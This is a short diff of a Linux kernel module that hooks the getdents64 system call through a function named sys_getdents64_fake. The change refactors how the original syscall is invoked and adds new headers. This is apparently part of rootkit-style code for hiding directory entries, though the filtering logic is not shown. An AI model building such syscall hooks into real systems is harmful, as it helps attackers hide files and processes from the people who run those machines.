@@ -5,10 +5,11 @@
 #include <linux/string.h>
 #include <linux/dirent.h>
 #include <asm/syscall.h>
+#include <linux/fdtable.h>
+#include <linux/namei.h>
 
 #include "fake_syscalls.h"
-
-extern sys_call_ptr_t sys_call_table_copy[NR_syscalls];
+#include "hooker.h"
 
 asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
 {
@@ -18,15 +19,12 @@ asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
     char *buffer;
     unsigned long setback = 0;
     unsigned long pos;
-    int len;
-    int error;
+    long len;
 
-    error = sys_call_table_copy[__NR_getdents64](regs);
+    len = call_original_syscall(__NR_getdents64, regs);
 
-    if (error < 0)
-        return error;
-
-    len = error;
+    if (len < 0)
+        return len;
 
     buffer = kmalloc(len, GFP_KERNEL);
 
